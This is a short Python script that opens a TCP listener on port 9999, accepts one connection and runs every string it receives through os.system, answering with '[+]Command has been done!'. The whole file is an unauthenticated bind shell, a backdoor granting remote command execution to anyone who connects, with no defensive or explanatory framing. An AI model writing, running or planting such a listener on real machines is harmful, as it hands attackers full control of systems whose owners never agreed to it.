from socket import *
import os
import sys

host = gethostbyname(gethostname())
port = 9999
ADDR = (host,port)
def createServer():
    global session,connection

    session = socket(AF_INET, SOCK_STREAM)
    session.bind(ADDR)
    session.listen(1)
    try:
        print("[+]Wating for connection......")
        connection, address = session.accept()
        print("[+]Connectiong is build up")
    except:
        print("[-]Can not connect")
    listeningServer()

def listeningServer():
    while True:
        command = connection.recv(1024)
        final = command.decode()
        try:
           os.system(final)
           connection.send(("[+]Command has been done!").encode())
        except:
            connection.send(("[-]Command has not been done!").encode())
print(host)
createServer()


